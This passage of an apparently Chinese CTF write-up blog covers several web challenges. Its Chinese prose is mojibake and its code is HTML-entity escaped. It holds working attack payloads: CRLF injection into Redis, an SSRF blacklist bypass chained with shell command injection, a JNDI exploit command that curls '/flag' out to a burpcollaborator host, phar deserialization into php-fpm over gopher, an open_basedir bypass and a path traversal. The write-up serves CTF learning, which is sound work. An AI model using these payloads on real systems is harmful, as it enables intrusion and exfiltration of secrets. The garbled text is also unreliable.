def input(self,url=\u0026#34;\u0026#34;,submit=\u0026#34;\u0026#34;): file=open(\u0026#34;index.html\u0026#34;,\u0026#34;r\u0026#34;).read() reheaders=\u0026#34;\u0026#34; if cherrypy.request.method==\u0026#34;GET\u0026#34;: reheaders=\u0026#34;\u0026#34; else: url=cherrypy.request.params[\u0026#34;url\u0026#34;] submit=cherrypy.request.params[\u0026#34;submit\u0026#34;] try: for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+\u0026#34;\u0026lt;br\u0026gt;\u0026#34; except Exception,e: reheaders=\u0026#34;é”™è¯¯\u0026#34;+str(e) for x in urllib2.urlopen(url).info().headers: reheaders=reheaders+x+\u0026#34;\u0026lt;br\u0026gt;\u0026#34; file=file.replace(\u0026#34;\u0026lt;?response?\u0026gt;\u0026#34;,reheaders) return file @cherrypy.expose def login(self,password=\u0026#34;\u0026#34;,submit=\u0026#34;\u0026#34;): pool = redis.ConnectionPool(host=\u0026#39;127.0.0.1\u0026#39;, port=6379) r = redis.Redis(connection_pool=pool) re=\u0026#34;\u0026#34; file=open(\u0026#34;login.html\u0026#34;,\u0026#34;r\u0026#34;).read() if cherrypy.request.method==\u0026#34;GET\u0026#34;: re=\u0026#34;\u0026#34; else: password=cherrypy.request.params[\u0026#34;password\u0026#34;] submit=cherrypy.request.params[\u0026#34;submit\u0026#34;] if r.get(\u0026#34;admin\u0026#34;)==password: re=open(\u0026#34;flag\u0026#34;,\u0026#39;r\u0026#39;).readline() else: re=\u0026#34;Can\u0026#39;t find admin:\u0026#34;+password+\u0026#34;,fast fast fast.....\u0026#34; file=file.replace(\u0026#34;\u0026lt;?response?\u0026gt;\u0026#34;,re) return file cherrypy.config.update({\u0026#39;server.socket_host\u0026#39;: \u0026#39;0.0.0.0\u0026#39;, \u0026#39;server.socket_port\u0026#39;: 8080, }) cherrypy.quickstart(web7(),\u0026#39;/\u0026#39;) ä½¿ç”¨çš„urllib2.urlopenåº“åªæ”¯æŒhttp https ftp fileè¿™å‡ ç§schemaï¼Œä¸èƒ½ç”¨gopherï¼Œä½†æ˜¯æœ‰ä¸ªcveï¼ˆå’Œä¸Šå‘¨æçš„nodejsçš„é‚£ä¸ªæœ‰ç‚¹åƒï¼‰ï¼Œå®ƒåœ¨å¤„ç†urlçš„æ—¶å€™æ²¡æœ‰è€ƒè™‘æ¢è¡Œç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨æ­£å¸¸çš„httpå¤´ä¸­æ’å…¥ä»»æ„å†…å®¹\nçœŸçš„è·Ÿnodejsé‚£ä¸ªå¾ˆåƒï¼Œnodeé‚£ä¸ªè¿˜å¤šä¸€ä¸ªä»‹è´¨ï¼ˆå¤„ç†unicodeå­—ç¬¦æ—¶è½¬åŒ–å‡ºé—®é¢˜ï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦å‘redisä¸­å†™å…¥è¾“å…¥æ”¹æ‰adminå¯†ç å°±è¡Œäº†\nhttp://127.0.0.1%0d%0aset%20admin%20admin%0d%0asave%0d%0a:6379/amiz å‚è€ƒï¼šwp\n[ç½‘é¼æ¯ 2020 åŠå†³èµ›]BabyJS æ˜¯expressæ¡†æ¶ï¼Œcookieçš„sessionå­—æ®µåˆå§‹æ˜¯{\u0026quot;admin\u0026quot;:\u0026quot;no\u0026quot;}ï¼Œæ”¹ä¸ºyesåè¿˜æ˜¯ä¼šé‡å®šå‘å›æ¥ï¼›ç„¶åå‘ç°è‡ªå·±çœ¼çæ²¡çœ‹è§é™„ä»¶ï¼Œæˆ‘çš„ï¼›è¯¦ç»†çš„è·¯ç”±ä»£ç åœ¨index.jsï¼Œçœ‹åˆ°blacklistå°±æœ‰SSRFçš„æ—¢è§†æ„Ÿäº†\nvar express = require(\u0026#39;express\u0026#39;); var config = require(\u0026#39;../config\u0026#39;); var url=require(\u0026#39;url\u0026#39;); var child_process=require(\u0026#39;child_process\u0026#39;); var fs=require(\u0026#39;fs\u0026#39;); var request=require(\u0026#39;request\u0026#39;); var router = express.Router(); var blacklist=[\u0026#39;127.0.0.1.xip.io\u0026#39;,\u0026#39;::ffff:127.0.0.1\u0026#39;,\u0026#39;127.0.0.1\u0026#39;,\u0026#39;0\u0026#39;,\u0026#39;localhost\u0026#39;,\u0026#39;0.0.0.0\u0026#39;,\u0026#39;[::1]\u0026#39;,\u0026#39;::1\u0026#39;]; router.get(\u0026#39;/\u0026#39;, function(req, res, next) { res.json({}); }); router.get(\u0026#39;/debug\u0026#39;, function(req, res, next) { console.log(req.ip); if(blacklist.indexOf(req.ip)!=-1){\t// req.ipåœ¨é»‘åå•ä¸­ console.log(\u0026#39;res\u0026#39;); var u=req.query.url.replace(/[\\\u0026#34;\\\u0026#39;]/ig,\u0026#39;\u0026#39;); console.log(url.parse(u).href); let log=`echo \u0026#39;${url.parse(u).href}\u0026#39;\u0026gt;\u0026gt;/tmp/log`; console.log(log); child_process.exec(log);\t// å‘½ä»¤æ‰§è¡Œ res.json({data:fs.readFileSync(\u0026#39;/tmp/log\u0026#39;).toString()}); }else{ res.json({}); } }); router.post(\u0026#39;/debug\u0026#39;, function(req, res, next) { console.log(req.body); if(req.body.url !== undefined) { var u = req.body.url;\t// POST urlå‚æ•° var urlObject=url.parse(u);\t// å¯¹urlè¿›è¡Œparse if(blacklist.indexOf(urlObject.hostname) == -1){\t// hostnameä¸åœ¨é»‘åå•ä¸­ var dest=urlObject.href; request(dest,(err,result,body)=\u0026gt;{\t// è®¿é—® ç›®æ ‡ res.json(body); }) } else{ res.json([]); } } }); module.exports = router; éœ€è¦æ„é€ ä¸€ä¸ªssrfçš„urlï¼Œpostæ–¹å¼ä¼ å…¥å¹¶ä¸”ç»•è¿‡ssrfçš„é»‘åå•ï¼Œæ¯”å¦‚\nhttp://0177.0.0.01/\t# å…«è¿›åˆ¶ http://2130706433/\t# åè¿›åˆ¶ åé¢æ¥ä¸Š/debug?url=xxxxï¼Œpostä¼ å…¥åè°ƒç”¨requestä¼šåˆ°get /debugè¿›è¡Œå¤„ç†ï¼Œå°±å¯ä»¥child_process_execæ‰§è¡Œå‘½ä»¤äº†\næ‰§è¡Œå‘½ä»¤çš„è¯ï¼Œå› ä¸ºåé¢å®ƒä¼šè¯»å‡º/tmp/logçš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠflagå†™å…¥è¿™ä¸ªæ–‡ä»¶ä¸­ï¼Œç”¨cp /flag /tmp/log\næ„é€ payloadæ—¶åŸä»£ç æ˜¯è¿™æ ·çš„\nlet log=`echo \u0026#39;${url.parse(u).href}\u0026#39;\u0026gt;\u0026gt;/tmp/log`; æ‰€ä»¥å…ˆè¦é—­åˆechoåé¢çš„å•å¼•å·ï¼Œå†è€ƒè™‘url.parse(u).hrefçš„ç»“æœï¼Œæœ€åç”¨#æŠŠåé¢å¤šä½™çš„æ³¨é‡Šæ‰ï¼›ç„¶è€Œæœ‰ä¸ªæ­£åˆ™åŒ¹é…è¦å…ˆè¿‡æ»¤ä¸€ä¸‹å•å¼•å·\nvar u=req.query.url.replace(/[\\\u0026#34;\\\u0026#39;]/ig,\u0026#39;\u0026#39;); æ‰€ä»¥ç”¨äºŒæ¬¡urlç¼–ç ï¼š' -\u0026gt; %27 -\u0026gt; %2527åŠ @ï¼Œè®©url.parse().hrefæ—¶è®©@å‰çš„éƒ¨åˆ†è¢«decodeURIComponent\npayloadè¦å†ç¼–ä¸€æ¬¡ç \nPOST: url=http://2130706433/debug?url=http://%252527@1;cp$IFS$9/flag$IFS$9/tmp/log;%25%23 flag{876797a7-fe5f-4a11-aa1f-bd0fbcb1640e}\n[çº¢æ˜è°·CTF 2021]JavaWeb ä¸å¼ºç½‘æ‹Ÿæ€çš„Jack-Shiroç­‰ç­‰é¢˜éƒ½æ˜¯ä¸€æ ·çš„è€ƒç‚¹ï¼Œé¦–å…ˆæ˜¯ä¸€ä¸ª/;/jsonç»•è¿‡é‰´æƒï¼Œä¹‹åæ˜¯jndiæ³¨å…¥ï¼Œç”¨é‚£ä¸ªjarä¸€æŠŠæ¢­\n[\u0026#34;ch.qos.logback.core.db.JNDIConnectionSource\u0026#34;,{\u0026#34;jndiLocation\u0026#34;:\u0026#34;rmi://101.35.114.107:1099/qhx0ip\u0026#34;}] java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026#34;curl http://mg6uynla2pxa8ilgp4cprm0suj09oy.burpcollaborator.net/ -F file=@/flag\u0026#34; -A \u0026#34;101.35.114.107\u0026#34; [b01lers2020]Scrambled é¡µé¢ä¸Šåªæœ‰ä¸€ä¸ªæ²¹ç®¡è§†é¢‘ï¼Œæ²¡æœ‰ç‰¹æ®Šçš„è¡Œä¸º\næŠ“åŒ…çœ‹åˆ°cookieï¼Œåœ¨æ¯ä¸€æ¬¡reloadï¼ˆåœ¨é¡µé¢åº•éƒ¨ï¼‰ä¹‹åéƒ½ä¼šæ›´æ–°\nä¸¤ä¸ªå­—æ®µï¼Œfrequencyå’Œtransmissions\næ²¡æ˜ç™½å•¥æ„æ€ï¼Œçœ‹wpçŸ¥é“è¿™é‡Œæ˜¯ä»£è¡¨äº†æ¯ä¸€ä½flagçš„å€¼ï¼Œæ¯”å¦‚ä¸Šé¢å›¾ç‰‡é‡Œçš„\n7-12\t-\u0026gt; 12ä½æ˜¯`-` å‰ä¸€ä½æ˜¯`7` 0f15\t-\u0026gt; 15ä½æ˜¯`f` å‰ä¸€ä½æ˜¯`0` æ•´ä¸ªpyè„šæœ¬è‡ªåŠ¨ï¼ˆå‚è€ƒwp\nimport requests import re url = \u0026#39;http://a3197079-a7bd-4d2f-847b-bad3410130b7.node4.buuoj.cn:81/\u0026#39; headers = {\u0026#39;Cookie\u0026#39;: \u0026#39;frequency=1; transmissions=kxkxkxkxsh7-12kxkxkxkxsh\u0026#39;} flag = [0] * 50 while True: r = requests.session() cookie = r.get(url, headers=headers).headers[\u0026#39;Set-Cookie\u0026#39;] # å¾—åˆ°ä¸‹ä¸€æ¬¡çš„cookie try: tmp = re.search(r\u0026#39;kxkxkxkxsh(.+)kxkxkxkxsh;\u0026#39;, cookie).group()[10:-11] # åŒ¹é…ä¸­é—´æœ‰ç”¨çš„éƒ¨åˆ† flag[int(tmp[2:])] = tmp[1:2] flag[int(tmp[2:]) - 1] = tmp[0:1] for i in flag: print(i, end=\u0026#39;\u0026#39;) print() except: pass flag{3e6d8ee7-40f1-40a1-b496-93c40f43c8b8}\n[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp4-Rceme ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„é¡µé¢ï¼Œéœ€è¦éªŒè¯ç ï¼Œä¸è¿‡è¿™ä¸ªéªŒè¯ç æ˜¯å¸¸è§è€ƒç‚¹äº†\nimport hashlib def func(md5_val): for x in range(999999, 100000000): md5_value=hashlib.md5(str(x).encode(encoding=\u0026#39;utf-8\u0026#39;)).hexdigest() if md5_value[:5]==md5_val: return str(x) if __name__ == \u0026#39;__main__\u0026#39;: print(func(\u0026#39;6e3f2\u0026#39;)) å‘½ä»¤æ‰§è¡Œçš„éƒ¨åˆ†ï¼Œç›´æ¥çœ‹å‡ºé¢˜äººçš„wpå§ï¼Œç”¨çš„æ˜¯[~(å¼‚æˆ–)][!%FF]çš„å½¢å¼ç»„æˆå­—ç¬¦ä¸²,ç„¶åæ— å‚æ•°RCE\nè¿™éƒ¨åˆ†ç”¨çš„æ˜¯å¼‚æˆ–æ„é€ çš„æ–¹å¼ï¼Œemmmï¼Œä¸Šå‘¨è¯´è¦æ€»ç»“çš„ï¼Œä½†æ˜¯æ²¡æ€»ç»“ï¼ˆæˆ‘çš„ï¼Œè¿™å‘¨ä¸€å®šçœ‹\nå‚è€ƒï¼šå®˜æ–¹wp | wp1\n[Windows][HITCON 2019]Buggy_Net /Default.txtç»™å‡ºäº†æºç ï¼Œæ˜¯å°‘è§çš„win+asp.net\nbool isBad = false; try { if ( Request.Form[\u0026#34;filename\u0026#34;] != null ) { // filenameå‚æ•°éç©º isBad = Request.Form[\u0026#34;filename\u0026#34;].Contains(\u0026#34;..\u0026#34;) == true; // å¦‚æœfilenameä¸­å«æœ‰`..`ä¸ºtrue } } catch (Exception ex) { } try { if (!isBad) { // isBadä¸ºfalse Response.Write(System.IO.File.ReadAllText(@\u0026#34;C:\\inetpub\\wwwroot\\\u0026#34; + Request.Form[\u0026#34;filename\u0026#34;])); // è¯»å‡ºfilenameæŒ‡å®šçš„æ–‡ä»¶ } } catch (Exception ex) { } ä½†æ˜¯å½“å‰ç›®å½•åœ¨C:\\inetpub\\wwwroot\\ï¼Œéœ€è¦..\\è¿›è¡Œç›®å½•ç©¿è¶Šï¼›è¿™é‡Œçš„åˆ©ç”¨æ–¹å¼å‚è€ƒ-\u0026gt;WAF Bypass Techniques - Using HTTP Standard and Web Serversâ€™ Behaviour | wpï¼Œè¿™é‡Œè½¬è¿°ä¸€ä¸‹\nå¯¹äºPOSTè¯·æ±‚ï¼Œä¼šå­˜åœ¨request validationæ¥æ£€æµ‹formè¡¨å•ä¸­å«æœ‰ä¸€äº›å±é™©å†…å®¹ï¼ˆæ¯”å¦‚\u0026lt;xï¼‰ï¼Œå¤„ç†çš„æ–¹å¼æ˜¯ä¸­æ­¢æ•´ä¸ªappï¼›ç„¶è€Œå¯¹äºç›¸åŒçš„å†…å®¹ï¼Œåœ¨query-string fieldsä¸­ä¼šé€šè¿‡åˆå§‹çš„request validationï¼Œå¹¶ä¸”ä»…ä»…åœ¨é¦–æ¬¡çš„Request.QueryString[...]æŠ›å‡ºå¼‚å¸¸\nå¯¹äºGETçš„query-string filedsä¹Ÿå­˜åœ¨request validationï¼Œä½†æ˜¯å¦‚æœåŠ ä¸€ä¸ªformè¡¨å•ï¼Œå°±ä¼šäº§ç”Ÿå’Œä¸Šè¿°ååŠéƒ¨åˆ†ä¸€æ ·çš„æ•ˆæœ\næ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å¯ä»¥æäº¤ä¸€ä¸ªGETè¯·æ±‚ï¼ˆä¸å¸¦æœ‰getæŸ¥è¯¢å‚æ•°ï¼‰ï¼Œä½†æ˜¯ä¾ç„¶å«æœ‰bodyéƒ¨åˆ† å¹¶ä¸”æŠŠ\u0026lt;xåŠ åˆ°bodyä¸­ï¼Œå°±ä¼šä½¿ç¬¬ä¸€æ¬¡çš„åˆ¤æ–­ä¸­è¿›å…¥å¼‚å¸¸éƒ¨åˆ†-\u0026gt;passï¼Œä¸ä¿®æ”¹isBadçš„boolå€¼ï¼Œè¿›å…¥ç¬¬äºŒæ¬¡åˆ¤æ–­åç›´æ¥æ‹¼æ¥filenameï¼Œè¯»å‡ºflagï¼›payload\nGET / POST: filename=../../../flag.txt\u0026amp;amiz=\u0026lt;x å‚è€ƒï¼šWAF Bypass Techniques - Using HTTP Standard and Web Serversâ€™ Behaviour | wp\nflag{e2c62455-e081-4782-8320-7c76ef570244}\n*[NCTF2019]phar matches everything ç»™å‡ºäº†æºç ï¼Œç›´æ¥github.devçœ‹äº† è¿™é‡Œæ˜¯url\nä¸¤ä¸ªæ–‡ä»¶å¤¹åˆ†åˆ«æ˜¯ä¸¤ä¸ªdockerï¼ˆç”¨dockerfileç¼–æ’åˆ°ä¸€èµ·äº† ipä¸åŒï¼‰\nosrcçš„æœ‰80ç«¯å£æš´éœ²åœ¨å¤–é¢ï¼Œç»“åˆé¡µé¢çš„äº¤äº’å…ˆçœ‹osrcä¸­çš„catchmine.phpå’Œupload.php\nupload.phpï¼Œå¯ä»¥ä¸Šä¼ æ–‡ä»¶\n\u0026lt;?php $target_dir = \u0026#34;uploads/\u0026#34;; $uploadOk = 1; $imageFileType=substr($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;],strrpos($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;],\u0026#39;.\u0026#39;)+1,strlen($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;])); $file_name = md5(time()); $file_name =substr($file_name, 0, 10).\u0026#34;.\u0026#34;.$imageFileType; $target_file=$target_dir.$file_name; $check = getimagesize($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;]); // getimagesizeæ£€æµ‹æ–‡ä»¶ç±»å‹ å¯è§¦å‘ååºåˆ—åŒ– if($check !== false) { echo \u0026#34;File is an image - \u0026#34; . $check[\u0026#34;mime\u0026#34;] . \u0026#34;.\u0026#34;; $uploadOk = 1; } else { echo \u0026#34;File is not an image.\u0026#34;; $uploadOk = 0; } if (file_exists($target_file)) { // æ£€æµ‹åŒå å½“ç„¶å› ä¸ºmd5çš„åŸå› ä¹Ÿä¸å¤ªèƒ½åŒå echo \u0026#34;Sorry, file already exists.\u0026#34;; $uploadOk = 0; } if ($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;size\u0026#34;] \u0026gt; 500000) { // é™åˆ¶å¤§å° echo \u0026#34;Sorry, your file is too large.\u0026#34;; $uploadOk = 0; } if($imageFileType !== \u0026#34;jpg\u0026#34; \u0026amp;\u0026amp; $imageFileType !== \u0026#34;png\u0026#34; \u0026amp;\u0026amp; $imageFileType !== \u0026#34;gif\u0026#34; \u0026amp;\u0026amp; $imageFileType !== \u0026#34;jpeg\u0026#34; ) { // åç¼€ç™½åå• echo \u0026#34;Sorry, only jpg,png,gif,jpeg are allowed.\u0026#34;; $uploadOk = 0; } if ($uploadOk == 0) { echo \u0026#34;Sorry, your file was not uploaded.\u0026#34;; } else { if (move_uploaded_file($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;], $target_file)) { echo \u0026#34;The file $file_name has been uploaded to ./uploads/\u0026#34;; // å›æ˜¾æ–‡ä»¶è·¯å¾„ } else { echo \u0026#34;Sorry, there was an error uploading your file.\u0026#34;; } } ?\u0026gt; catchmine.phpæœ‰ä¸ªååºåˆ—åŒ–ç‚¹\n\u0026lt;?php class Easytest{ protected $test; // $test = \u0026#39;1\u0026#39; æ³¨æ„ååºåˆ—åŒ–äº§ç”Ÿä¸å¯è§å­—ç¬¦ æ”¹æˆpublic public function funny_get(){ return $this-\u0026gt;test; } } class Main { public $url; public function curl($url){ // å®ç°curlæ“ä½œ $ch = curl_init(); curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_RETURNTRANSFER,true); $output=curl_exec($ch); curl_close($ch); return $output; } public function __destruct(){ $this_is_a_easy_test=unserialize($_GET[\u0026#39;careful\u0026#39;]); // ååºåˆ—åŒ–å…¥å£ Easytestå®ä¾‹ if($this_is_a_easy_test-\u0026gt;funny_get() === \u0026#39;1\u0026#39;){ echo $this-\u0026gt;curl($this-\u0026gt;url); // å¯ä»¥è®¿é—®å†…ç½‘ è¿›è¡Œssrf } } } if(isset($_POST[\u0026#34;submit\u0026#34;])) { $check = getimagesize($_POST[\u0026#39;name\u0026#39;]); // getimagesizeæ£€æµ‹æ–‡ä»¶ç±»å‹ å¯è§¦å‘ååºåˆ—åŒ– if($check !== false) { echo \u0026#34;File is an image - \u0026#34; . $check[\u0026#34;mime\u0026#34;] . \u0026#34;.\u0026#34;; } else { echo \u0026#34;File is not an image.\u0026#34;; } } ?\u0026gt; è¿™ä¸ªssrfè‚¯å®šå°±æ˜¯å¦ä¸€ä¸ªæ–‡ä»¶å¤¹é‡Œçš„ä¸œè¥¿äº†ï¼Œæ­£å¥½å¼€ç€fpmï¼Œé‚£å°±æ˜¯ssrfæ‰“9000ç«¯å£çš„fpmäº†ï¼Œphp.iniä¸­è¿˜é™åˆ¶äº†open_basedirï¼Œåé¢è¿˜å¾—é¥¶ä¸€ä¸‹ï¼ˆè¿™æ˜¯å•¥å¥—å¨ƒé¢˜å•Šï¼ŒçœŸçš„å¥—\nå®³ï¼Œè¿˜å¾—åšã€‚å…ˆæ˜¯æ„é€ ç¬¬ä¸€ä¸ªpharï¼Œå°†urlè®¾ä¸ºfile:///etc/hostsçœ‹å†…ç½‘åœ°å€\n\u0026lt;?php class Easytest{ protected $test = \u0026#39;1\u0026#39;; } class Main { public $url = \u0026#39;file:///etc/hosts\u0026#39;; } $c = new Easytest();\t// æ³¨æ„pharä¸­çš„æ˜¯Main ä¹‹åå†ååºåˆ—åŒ–çš„æ˜¯Easytest echo urlencode(serialize($c)); // O%3A8%3A%22Easytest%22%3A1%3A%7Bs%3A7%3A%22%00%2A%00test%22%3Bs%3A1%3A%221%22%3B%7D $a = new Main(); $phar = new Phar(\u0026#34;exp.phar\u0026#34;); $phar -\u0026gt; startBuffering(); $phar -\u0026gt; setStub(\u0026#39;GIF89a\u0026#39;.\u0026#39;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#39;); $phar -\u0026gt; setMetadata($a); $phar -\u0026gt; addFromString(\u0026#39;test.txt\u0026#39;,\u0026#39;test\u0026#39;); $phar -\u0026gt; stopBuffering(); æ”¹åç¼€å’ŒMIMEä¸Šä¼ ï¼Œæ‹¿åˆ°è·¯å¾„./uploads/dce6e76f20.jpgï¼Œç„¶ååˆ°/catchmime.php?careful=å¤„è§¦å‘ï¼Œcarefulå‚æ•°ä¼ å…¥\nè¿™çœ‹äº†ä¸ªå¯‚å¯ï¼Œå¯„ï¼Œç›´æ¥çœ‹/proc/net/arpå§\nå°´å°¬å°±å°´å°¬åœ¨è¿™ä¿©éƒ½ä¸æ˜¯æˆ‘ä»¬ç›´æ¥çš„ipï¼Œæƒ³æ‰¾çš„é¶æœºå°±åœ¨è¿™ä¸ªç½‘æ®µé‡Œï¼Œä½†æ˜¯æˆ‘éƒ½åŠ å‡5ä½äº†ï¼Œéƒ½æ²¡æ‰¾åˆ°æˆ‘ä»¬çš„ç›®æ ‡é¶æœºâ€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦â€¦åŠ å‡5ä½å·²ç»å¾ˆå¤šäº†â€¦â€¦\nå¯„ã€‚åé¢çš„æµç¨‹æˆ‘ç®€å•è¯´ä¸€ä¸‹å§ï¼Œæ‡’å¾—æœ¬åœ°æ­ç¯å¢ƒï¼Œå°±äº‘äº†ï¼Œå°±æ˜¯æ‘†ã€‚\né¦–å…ˆç”¨pç‰›é‚£ä¸ªfpmçš„è„šæœ¬æ„é€ gopherçš„payload\npython fpm.py ip \u0026#39;/var/www/html/index.php\u0026#39; -p 9000 -c \u0026#34;\u0026lt;?php phpinfo();?\u0026gt;\u0026#34; å°†ç”Ÿæˆçš„payloadå‰é¢åŠ ä¸Šgopher://ip:9000/_ï¼Œæ”¾å…¥å‰é¢æ„é€ pharè„šæœ¬çš„urlå‚æ•°ä¸­ï¼Œä¸Šä¼ å¹¶è§¦å‘ï¼Œå›æ˜¾æ­£å¸¸\nå› ä¸ºè¿˜æœ‰disable_functionså’Œopen_basedirçš„å­˜åœ¨ï¼Œæ‰€ä»¥å†ç»•ä¸€ä¸‹\n\u0026lt;?php mkdir(\u0026#39;/tmp/fuck\u0026#39;);chdir(\u0026#39;/tmp/fuck\u0026#39;);ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);chdir(\u0026#39;..\u0026#39;);ini_set(\u0026#39;open_basedir\u0026#39;,\u0026#39;/\u0026#39;);print_r(scandir(\u0026#39;/\u0026#39;));readfile(\u0026#39;/flag\u0026#39;);?\u0026gt; // è¿™é‡Œçš„éƒ¨åˆ†ä½œä¸ºfpm.pyçš„å‚æ•°ç”Ÿæˆæ–°çš„gopher payload å†ä¼ pharï¼Œå†è§¦å‘å°±èƒ½çœ‹flagäº†\nâ€”â€”â€”â€”æ„Ÿæƒ³ï¼š19å¹´è¿™æ ·çš„å°±æ˜¯éš¾é¢˜äº†ï¼Œä½†æ˜¯æ”¾åˆ°2021ï¼Œä¸å¯¹ 2022å¹´ï¼Œè¿™æ ·çš„é¢˜å°±æ˜¯çº¯å¥—å¨ƒè€Œä¸éš¾äº†ï¼Œä¾§é¢åæ˜ ctfçœŸä»–å¦ˆçš„å¤ªå·äº†ï¼Œå¯„\n[2021ç¥¥äº‘æ¯]cralwer_z å””ï¼Œæˆ‘ä»¥ä¸ºæˆ‘å½“æ—¶æ‰“äº†ï¼Œä½†æ˜¯å¥½åƒå¹¶æ²¡æœ‰ï¼ˆå°´å°¬\næ³¨å†Œè´¦å·ç™»å…¥ï¼Œåªæœ‰ä¿®æ”¹profileä¸€ä¸ªé€‰é¡¹ï¼Œå¯ä»¥æ”¹username, affilication, age, Bucketï¼›çœ‹ä¸‹æºç \nindex.jså¤„ç†/signup, /signin, /logoutï¼Œuser.jså¤„ç†/user/profileï¼Œé‡ç‚¹çœ‹ä¸‹è¿™è¾¹\nrouter.post(\u0026#39;/profile\u0026#39;, async (req, res, next) =\u0026gt; { let { affiliation, age, bucket } = req.body; const user = await User.findByPk(req.session.userId); if (!affiliation || !age || !bucket || typeof (age) !== \u0026#34;string\u0026#34; || typeof (bucket) !== \u0026#34;string\u0026#34; || typeof (affiliation) != \u0026#34;string\u0026#34;) { return res.render(\u0026#39;user\u0026#39;, { user, error: \u0026#34;Parameters error or blank.\u0026#34; }); } if (!utils.checkBucket(bucket)) { return res.render(\u0026#39;user\u0026#39;, { user, error: \u0026#34;Invalid bucket url.\u0026#34; }); } let authToken; try {\t// æ›´æ–°å†…å®¹ await User.update({ affiliation, age, personalBucket: bucket }, { where: { userId: req.session.userId } }); const token = crypto.randomBytes(32).toString(\u0026#39;hex\u0026#39;); authToken = token; await Token.create({ userId: req.session.userId, token, valid: true }); await Token.update({ valid: false, }, { where: { userId: req.session.userId, token: { [Op.not]: authToken } } }); } catch (err) { next(createError(500)); } if (/^https:\\/\\/[a-f0-9]{32}\\.oss-cn-beijing\\.ichunqiu\\.com\\/$/.exec(bucket)) {\t// å¯¹bucketè¿›è¡Œæ­£åˆ™åŒ¹é… ç¬¦åˆè¿™ä¸ªå½¢å¼ res.redirect(`/user/verify?token=${authToken}`) } else {\t// åŒ¹é…å¤±è´¥ // Well, admin won\u0026#39;t do that actually XD. return res.render(\u0026#39;user\u0026#39;, { user: user, message: \u0026#34;Admin will check if your bucket is qualified later.\u0026#34; }); } }); router.get(\u0026#39;/verify\u0026#39;, async (req, res, next) =\u0026gt; { let { token } = req.query; if (!token || typeof (token) !== \u0026#34;string\u0026#34;) { return res.send(\u0026#34;Parameters error\u0026#34;); } let user = await User.findByPk(req.session.userId); const result = await Token.findOne({ token, userId: req.session.userId, valid: true }); if (result) { try { await Token.update({ valid: false }, { where: { userId: req.session.userId } }); await User.update({ bucket: user.personalBucket }, { where: { userId: req.session.userId } }); user = await User.findByPk(req.session.userId); return res.render(\u0026#39;user\u0026#39;, { user, message: \u0026#34;Successfully update your bucket from personal bucket!\u0026#34; }); } catch (err) { next(createError(500)); } } else { user = await User.findByPk(req.session.userId); return res.render(\u0026#39;user\u0026#39;, { user, message: \u0026#34;Failed to update, check your token carefully\u0026#34; }) } }) // Not implemented yet router.get(\u0026#39;/bucket\u0026#39;, async (req, res) =\u0026gt; { const user = await User.findByPk(req.session.userId); if (/^https:\\/\\/[a-f0-9]{32}\\.oss-cn-beijing\\.ichunqiu\\.com\\/$/.exec(user.bucket)) { return res.json({ message: \u0026#34;Sorry but our remote oss server is under maintenance\u0026#34; }); } else {\t// åŒ¹é…å¤±è´¥ // Should be a private site for Admin try { const page = new Crawler({ userAgent: \u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36\u0026#39;, referrer: \u0026#39;https://www.ichunqiu.com/\u0026#39;, waitDuration: \u0026#39;3s\u0026#39; }); await page.goto(user.bucket);\t// gotoå°è£…äº†ä¸€äº›é¡µé¢è®¿é—®çš„å‡½æ•° const html = page.htmlContent; const headers = page.headers; const cookies = page.cookies; await page.close(); // è¿›è¡Œä¸€ä¸ªé¡µé¢çš„è®¿é—® è¿”å›html headers cookies return res.json({ html, headers, cookies}); } catch (err) { return res.json({ err: \u0026#39;Error visiting your bucket. \u0026#39; }) } } }); å¤§è‡´å®¡ä¸€ä¸‹ï¼Œæ˜¾ç„¶æœ€ç»ˆç›®æ ‡æ˜¯è®©bucketæˆä¸ºæˆ‘ä»¬çš„vpsåœ°å€è®©crawlerè®¿é—®\né¦–å…ˆæ„é€ ä¸€ä¸ªurlé€šè¿‡æ­£åˆ™æ›´æ–°profileä¸­çš„bucketä¿¡æ¯ï¼Œä½†æ˜¯åˆ«è®©å®ƒé‡å®šå‘ï¼ˆæ”¾æ‰è¿™ä¸ªåŒ… æ‹¿åˆ°authtokenï¼‰ï¼Œæ¥ç€åˆ°/user/profileé‡æ–°æ›´æ–°æˆ‘ä»¬çš„bucketï¼Œå†æ”¾æ‰ä¹‹å‰é‚£ä¸ª/user/verifyï¼ŒæŠŠæˆ‘ä»¬ç¬¬äºŒæ¬¡çš„ä¿¡æ¯æ›´æ–°äº†ï¼Œä¹‹åå†åˆ°/user/bucketå°±å¯ä»¥è®¿é—®æˆ‘ä»¬çš„vpsé¡µé¢äº†\né‚£å…ˆæ„é€ urlï¼Œè¿™ä¸ªæ­£åˆ™å¾ˆæ­»\nif (/^https:\\/\\/[a-f0-9]{32}\\.oss-cn-beijing\\.ichunqiu\\.com\\/$/.exec(bucket)) { res.redirect(`/user/verify?token=${authToken}`) } else { // Well, admin won\u0026#39;t do that actually XD. return res.render(\u0026#39;user\u0026#39;, { user: user, message: \u0026#34;Admin will check if your bucket is qualified later.\u0026#34; }); } 